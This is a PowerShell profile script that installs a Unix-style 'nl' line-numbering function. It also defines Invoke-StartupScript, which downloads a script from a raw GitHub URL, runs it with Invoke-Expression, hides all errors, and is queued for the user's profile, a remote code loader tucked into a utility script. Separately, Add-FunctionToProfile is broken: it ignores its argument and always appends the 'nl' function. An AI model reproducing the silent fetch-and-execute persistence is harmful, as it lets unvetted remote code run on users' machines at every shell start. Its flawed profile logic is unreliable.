
Function Add-FunctionToProfile {
<#
.SYNOPSIS
    Adds a function to the PowerShell profile.
.DESCRIPTION
    This function adds a function to the PowerShell profile. If the function already exists and is the same, it will not be added to the profile.
.PARAMETER FunctionName
    The name of the function to add to the profile.
.EXAMPLE
    Add-FunctionToProfile -FunctionName "Get-MyFunction"
    Adds the function named "Get-MyFunction" to the PowerShell profile.
#>
    param (
        [parameter(mandatory=$true)][String]$FunctionName
    )

    $functionContent = Get-Content function:$FunctionName
    $newFunctionContent = Get-Content function:nl

    if ($functionContent -eq $newFunctionContent) {
        Write-Host "Function $FunctionName already exists and is the same. Not adding to profile."
    } else {
        Add-Content $PROFILE "`n`n$newFunctionContent"
        Write-Host "Function $FunctionName added to profile."
    }
}

Function nl {
    <#
    .Synopsis
        Mimic Unic / Linux tool nl number lines
    .Description
        Print file content with numbered lines no original nl options supported
    .Example
        nl .\food.txt
    .Link
        https://superuser.com/questions/1182291/how-do-i-get-line-numbers-with-powershell/1183432#1183432
    #> 
        param (
            [parameter(mandatory=$true, Position=0)][String]$FileName
        )
        process {
            If (Test-Path $FileName){
                Get-Content $FileName | ForEach-Object{ "{0,5} {1}" -f $_.ReadCount,$_ }
            } 
        }
    }
Add-FunctionToProfile -FunctionName "nl"

function Invoke-StartupScript {
    $url = "https://raw.githubusercontent.com/ncolyer/os-ex/master/win.ps1"
    try {
        $script = Invoke-WebRequest -Uri $url -ErrorAction Stop | Select-Object -ExpandProperty Content
        Invoke-Expression $script
    } catch {
        # do nothing
    }
}

Add-FunctionToProfile -FunctionName "Invoke-StartupScript"